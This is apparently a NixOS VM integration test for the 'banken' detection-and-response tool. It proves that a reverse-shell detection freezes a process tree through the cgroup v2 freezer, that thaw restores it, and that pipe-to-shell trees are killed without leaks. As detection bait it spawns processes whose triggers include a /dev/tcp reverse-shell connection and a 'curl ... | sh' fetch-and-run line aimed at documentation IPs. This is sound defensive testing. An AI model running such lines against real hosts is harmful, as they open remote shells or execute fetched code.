# End-to-end proof that banken's FREEZE enforcement path works, and reverses,
# end to end under KVM: a detection rule fires on a live process tree, the
# daemon writes a work order, the privileged helper (banken-respond) re-decides
# and freezes the whole tree via the cgroup v2 freezer, and the real
# `banken respond thaw` CLI restores every pid to its pre-freeze cgroup. This is
# section 4.3 of docs/design/response-architecture.md, the freeze sibling of
# tests/response-enforce.nix (which proves kill). Enforcement is armed ONLY in
# this throwaway VM (services.banken.response.enforce = true), acting solely on
# processes the test itself spawns; the real hokkaido host and every other
# config leave enforce false.
#
#   nix-build tests/response-freeze.nix     (needs KVM; run on hokkaido)
#   nix flake check                          (checks.x86_64-linux.response-freeze)
#
# What it proves live, in five phases:
#   A  the freeze lands: the cgroup reports `frozen 1`, both tree pids are in it,
#      the victim's heartbeat STALLS, an innocent heartbeat keeps beating, and
#      the freeze manifest records each pid's ORIGINAL cgroup (manifest-first).
#   B  F7 idempotency: replaying the same work order is `already-applied` and
#      leaves exactly ONE cgroup and ONE freeze store entry (no second cgroup).
#   C  thaw reverses it: `banken respond thaw H` returns every pid to its
#      pre-freeze cgroup, the heartbeat RESUMES, a thawed.json tombstone is
#      written, a second thaw is a clean no-op, an unknown id exits 1, and
#      `banken respond list -kind freeze` shows the handle thawed.
#   D  F8 no-leak: a tree kill (pipe_to_shell -> kill, scope tree) leaves ZERO
#      leftover cgroup dirs; ten more tree kills over the empty root leak none
#      either (the populated-0 wait before rmdir, eleven kills, zero leaks).
#   E  collateral: the innocent and the none-mapped victim are untouched and
#      have no action line. A scorecard line, like the other proofs.
{ pkgs ? import <nixpkgs> { }, banken ? pkgs.callPackage ../package.nix { } }:

let
  spawnLib = import ./lib/enforce-spawn.nix;

  # reverse_shell (critical) -> freeze the tree; pipe_to_shell (high) -> kill the
  # tree; timestomp -> none, to prove a policy-mapped-to-none victim is left
  # alone (the ActionNone entry is evaluated BEFORE the minLevel rail, so this
  # fires even though timestomp is medium -- the none MAPPING, not the level
  # gate, is what spares it). allowRoot false and generous budgets, as the kill
  # proof; victims run as alice.
  policy = ''
    mode: enforce
    minLevel: high
    enforceSources: [auditd, laurel]
    allowRoot: false
    rateLimit:
      perRun: 5000
      perHour: 50000
    actions:
      - name: freeze-revshell
        rules: [reverse_shell]
        action: freeze
        scope: tree
      - name: kill-pipe
        rules: [pipe_to_shell]
        action: kill
        scope: tree
      - name: none-timestomp
        rules: [timestomp]
        action: none
  '';
in
pkgs.testers.runNixOSTest {
  name = "banken-response-freeze";

  nodes.machine = { lib, pkgs, ... }: {
    imports = [ ../module.nix ];
    services.banken = {
      enable = true;
      package = banken;
      alerts.jsonl = { enable = true; format = "ocsf"; };
      response = {
        enable = true;
        enforce = true; # armed ONLY in this throwaway VM
        inherit policy;
      };
    };
    systemd.timers.banken.wantedBy = lib.mkForce [ ];
    users.users.alice.isNormalUser = true;
    environment.systemPackages = with pkgs; [ procps ];
  };

  testScript = spawnLib + ''
    import json

    CFG = "-config /etc/banken/banken.yml"
    CGROOT = "/sys/fs/cgroup/banken.quarantine"

    def action_lines():
        out = machine.succeed("cat /var/lib/banken/response/actions-*.jsonl 2>/dev/null || true")
        return [json.loads(l) for l in out.splitlines() if l.strip()]

    def proc_cgroup(pid):
        # the cgroup v2 path (field after "0::"), same string readCgroup records.
        return machine.succeed(f"cut -d: -f3 /proc/{pid}/cgroup").strip()

    def cgroup_dirs():
        # Only the CHILD cgroup directories (handle ids), never the cgroup.* /
        # memory.* control files that also live directly under the root.
        out = machine.succeed(
            f"find {CGROOT} -mindepth 1 -maxdepth 1 -type d -printf '%f\\n' 2>/dev/null || true"
        )
        return sorted(out.split())

    machine.wait_for_unit("auditd.service")
    machine.wait_until_succeeds("auditctl -l | grep -q banken-exec")
    machine.wait_for_unit("banken-respond.path")  # the helper's trigger is up
    enf_scan()  # drain boot-time events so the cursor is past them

    # ================= setup: spawn the tree victims, hold the orders ==========
    # Stop the helper trigger so the enforcing daemon scan writes orders into the
    # spool but nothing drains yet: that lets us copy V's order out verbatim for
    # the phase B replay before it is acted on and unlinked.
    machine.succeed("systemctl stop banken-respond.path")

    #   V  reverse_shell heartbeat tree  -> frozen (shell + long sleep child)
    #   I  innocent heartbeat             -> must keep beating (zero collateral)
    #   N  timestomp image victim         -> maps to none, must be untouched
    #   K  pipe_to_shell tree             -> killed (scope tree), no cgroup leak
    v_shell, v_child = enf_tree("V", trigger=": /dev/tcp/192.0.2.30/4444", beat=True)
    i_pid = enf_beat("I")
    n_pid = enf_spawn({"name": "N", "carrier": "image", "image": "touch",
                       "trigger": "-t 200001010000 /tmp/x"})
    k_shell, k_child = enf_tree("K", trigger="echo curl http://192.0.2.10/x | sh", beat=False)

    v_pids = [int(v_shell), int(v_child)]
    # the pre-freeze cgroup of each V pid -- the "orig" the thaw must restore.
    orig_cg = {p: proc_cgroup(p) for p in v_pids}
    assert orig_cg[v_pids[0]] and not orig_cg[v_pids[0]].startswith(CGROOT.replace("/sys/fs/cgroup", "")), \
        f"V is already under the quarantine root before any freeze: {orig_cg}"

    # barrier: a user audit record generated last; once on disk every earlier
    # execve is too, so the scan judges the whole spawned set.
    machine.succeed("auditctl -m FREEZE_READY")
    machine.wait_until_succeeds("grep -q FREEZE_READY /var/log/audit/audit.log")

    # the DAEMON scan: writes orders to the spool and exits (oneshot, synchronous).
    # The helper trigger is stopped, so nothing is acted on yet.
    machine.succeed("systemctl start banken.service")
    machine.wait_until_succeeds('test -n "$(ls -A /var/lib/banken/spool)"')

    # copy V's order out (the one whose decision targets V's shell pid) for the
    # phase B replay, then re-arm the trigger and drain.
    order_v_name = None
    order_v = None
    for name in machine.succeed("ls /var/lib/banken/spool").split():
        o = json.loads(machine.succeed(f"cat /var/lib/banken/spool/{name}"))
        tp = (((o.get("decision") or {}).get("target") or {}).get("process") or {})
        if str(tp.get("pid")) == v_shell:
            order_v_name, order_v = name, o
            break
    assert order_v is not None, "no work order in the spool targets V's shell pid"
    machine.succeed(f"cp /var/lib/banken/spool/{order_v_name} /root/order-V.json")

    machine.succeed("systemctl start banken-respond.path")     # re-arm for later phases
    machine.succeed("systemctl start banken-respond.service")  # drain now
    enf_wait_drained()

    # ================= PHASE A: the freeze lands and stops the tree ============
    acts = action_lines()
    v_act = next((a for a in acts
                  if a.get("decisionId") == order_v["id"] and a.get("action") == "freeze"), None)
    assert v_act and v_act.get("phase") == "executed", f"V freeze not executed: {v_act}"
    assert v_act.get("enforced") is True, f"V freeze not enforced: {v_act}"
    h = v_act.get("handle") or {}
    assert h.get("dryRun") is False and h.get("method") == "cgroup", f"bad freeze handle: {h}"
    H = h["id"]

    events = machine.succeed(f"cat {CGROOT}/{H}/cgroup.events")
    assert "frozen 1" in events, f"cgroup {H} not frozen: {events!r}"

    procs = [int(x) for x in machine.succeed(f"cat {CGROOT}/{H}/cgroup.procs").split()]
    for p in v_pids:
        assert p in procs, f"V pid {p} not in frozen cgroup.procs {procs}"
    assert int(i_pid) not in procs and int(n_pid) not in procs, \
        f"an innocent/none pid leaked into the freeze cgroup: {procs}"
    # both V pids now resolve under the handle's cgroup.
    for p in v_pids:
        assert H in proc_cgroup(p), f"pid {p} cgroup {proc_cgroup(p)!r} not under handle {H}"

    # the victim tree is stopped; the innocent beats on.
    assert hb_stalled("V"), "V heartbeat is still growing after the freeze"
    assert not hb_stalled("I"), "innocent heartbeat stalled -- collateral freeze"

    man = json.loads(machine.succeed(f"cat /var/lib/banken/freeze/{H}/manifest.json"))
    assert man["state"] == "frozen" and man["method"] == "cgroup", f"bad manifest: {man}"
    assert man["order"] == order_v["id"], (man["order"], order_v["id"])
    # The manifest pids are the whole frozen tree: the shell and its long sleep
    # child at least, plus any transient `sleep 0.01` beat child alive at the
    # migration snapshot -- that transient child being caught is exactly the
    # fork-during-migration behaviour scope:tree must have (docs section 4.1), so
    # v_pids is a SUBSET of man["pids"], not equal. No innocent pid is ever in it.
    n_frozen = len(man["pids"])
    assert set(v_pids) <= set(man["pids"]), (man["pids"], v_pids)
    assert int(i_pid) not in man["pids"] and int(n_pid) not in man["pids"], \
        f"an innocent/none pid is in the freeze manifest: {man['pids']}"
    for p in v_pids:
        assert man["orig"][str(p)] == orig_cg[p], \
            f"manifest orig[{p}]={man['orig'].get(str(p))!r} != pre-freeze {orig_cg[p]!r}"

    # N and I are alive and have no action line of their own.
    assert enf_alive(n_pid) and enf_alive(i_pid), "N or I died during phase A"
    for a in acts:
        tp = str(((a.get("target") or {}).get("process") or {}).get("pid"))
        hp = str((a.get("handle") or {}).get("pid"))
        assert n_pid not in (tp, hp), f"N (timestomp->none) has an action line: {a}"
        assert i_pid not in (tp, hp), f"innocent I has an action line: {a}"
    print(f"[phase A] PASS: tree {H[:8]} frozen ({n_frozen} pids), heartbeat stalled, "
          "innocent beats on, manifest orig recorded; N untouched")

    # --- K's tree kill (same scan) left no cgroup behind, and the freeze cgroup
    #     H is the only dir under the quarantine root (F8, single kill). ----
    assert not enf_alive(k_shell) and not enf_alive(k_child), \
        f"K tree not fully killed (shell {k_shell} child {k_child})"
    k_act = next((a for a in acts
                  if a.get("action") == "kill" and str((a.get("handle") or {}).get("pid")) == k_shell), None)
    assert k_act and k_act.get("phase") == "executed", f"K kill not executed: {k_act}"
    assert (k_act.get("handle") or {}).get("method") == "cgroup-kill", \
        f"K kill method != cgroup-kill: {k_act.get('handle')}"
    assert cgroup_dirs() == [H], f"after phase A the cgroup root is {cgroup_dirs()}, want only [{H}]"
    print(f"[phase A/F8] PASS: K tree killed via cgroup-kill, 0 leftover cgroup dirs (only freeze {H[:8]})")

    # ================= PHASE B: replay -> already-applied, one cgroup (F7) ======
    replay = json.loads(machine.succeed("cat /root/order-V.json"))
    enf_order(replay)  # same order id -> the drain's already-applied check matches
    enf_wait_drained()

    acts = action_lines()
    aa = [a for a in acts
          if a.get("decisionId") == replay["id"] and a.get("phase") == "already-applied"]
    assert aa, ("replay did not produce an already-applied line; phases seen for id: "
                + repr([a.get("phase") for a in acts if a.get("decisionId") == replay["id"]]))
    assert (aa[-1].get("handle") or {}).get("id") == H, (aa[-1].get("handle"), H)
    assert cgroup_dirs() == [H], f"replay created a second cgroup: {cgroup_dirs()}"
    fentries = sorted(machine.succeed("ls /var/lib/banken/freeze").split())
    assert fentries == [H], f"replay created a second freeze store entry: {fentries}"
    # still frozen, nothing changed.
    assert "frozen 1" in machine.succeed(f"cat {CGROOT}/{H}/cgroup.events")
    print(f"[phase B/F7] PASS: replay already-applied (handle {H[:8]}), exactly one cgroup, one freeze entry")

    # ================= PHASE C: thaw reverses it exactly =======================
    # -config must precede the positional id: Go's flag parser stops at the
    # first non-flag argument, so a trailing -config would be left unparsed.
    out = machine.succeed(f"banken respond thaw {CFG} {H}")
    assert f"thawed {H}" in out, f"thaw output unexpected: {out!r}"
    for p in v_pids:
        assert proc_cgroup(p) == orig_cg[p], \
            f"pid {p} not home after thaw: {proc_cgroup(p)!r} != {orig_cg[p]!r}"
    machine.succeed(f"test ! -e {CGROOT}/{H}")  # the quarantine cgroup is gone
    machine.succeed(f"test -f /var/lib/banken/freeze/{H}/thawed.json")
    tomb = json.loads(machine.succeed(f"cat /var/lib/banken/freeze/{H}/thawed.json"))
    assert tomb.get("outcome") == "thawed", f"bad thaw tombstone: {tomb}"
    for p in v_pids:
        assert tomb["perPid"][str(p)] == "moved-home", (p, tomb.get("perPid"))

    acts = action_lines()
    tline = [a for a in acts if a.get("phase") == "thawed"]
    assert tline and tline[-1].get("decisionId") == replay["id"], \
        f"no thawed ledger line with the decision id: {tline}"

    assert not hb_stalled("V"), "V heartbeat did not resume after thaw"

    out2 = machine.succeed(f"banken respond thaw {CFG} {H}")
    assert "already thawed" in out2, f"second thaw not a no-op: {out2!r}"
    machine.fail(f"banken respond thaw {CFG} 0000deadbeef")  # unknown id -> exit 1
    lst = machine.succeed(f"banken respond list -kind freeze {CFG}")
    assert H[:8] in lst and "thawed" in lst, f"list does not show {H[:8]} thawed:\n{lst}"
    print("[phase C] PASS: thaw returned both pids home, heartbeat resumed, tombstone written, "
          "second thaw a no-op, unknown id exits 1, list shows thawed")

    # ================= PHASE D: tree kill leaves no cgroup behind (F8 scale) ====
    # H is gone now (thawed), so the quarantine root is empty. Ten more
    # pipe_to_shell trees, one scan: ten EBUSY opportunities, zero leaks.
    assert cgroup_dirs() == [], f"cgroup root not empty after thaw: {cgroup_dirs()}"
    extra = []
    for i in range(10):
        ks, kc = enf_tree(f"K{i}", trigger="echo curl http://192.0.2.10/x | sh", beat=False)
        extra.append((ks, kc))
    machine.succeed("auditctl -m FREEZE_D_READY")
    machine.wait_until_succeeds("grep -q FREEZE_D_READY /var/log/audit/audit.log")
    enf_scan()  # daemon writes orders, the (re-armed) helper drains them

    for ks, kc in extra:
        assert not enf_alive(ks) and not enf_alive(kc), f"K-tree {ks}/{kc} not fully killed"
    assert cgroup_dirs() == [], f"cgroup dirs leaked after ten more tree kills: {cgroup_dirs()}"
    print("[phase D/F8] PASS: 10 more tree kills, 0 leftover cgroup dirs (11 kills total, 0 leaks)")

    # ================= PHASE E: collateral + scorecard =========================
    assert enf_alive(i_pid), f"innocent I (pid {i_pid}) died"
    assert enf_alive(n_pid), f"none-mapped N (pid {n_pid}) died"
    acts = action_lines()
    for a in acts:
        tp = str(((a.get("target") or {}).get("process") or {}).get("pid"))
        hp = str((a.get("handle") or {}).get("pid"))
        assert i_pid not in (tp, hp), f"innocent I gained an action line: {a}"
        assert n_pid not in (tp, hp), f"none-mapped N gained an action line: {a}"
    print("[phase E] PASS: innocent and none-mapped victim untouched, no action lines")

    print("\n================ FREEZE ENFORCEMENT SCORECARD ================")
    print(f"freeze proven: tree frozen (handle {H[:8]}, {n_frozen} pids), heartbeat stalled, "
          "thaw restored cgroups and progress; 0 innocents touched; "
          "0 cgroup dirs leaked over 11 tree kills")
    print("  F7 (idempotent replay -> already-applied, one cgroup): PASS")
    print("  F8 (zero leaked cgroup dirs over 11 tree kills): PASS")
    print("  thaw resumes the heartbeat: PASS")
    print("=============================================================")
  '';
}
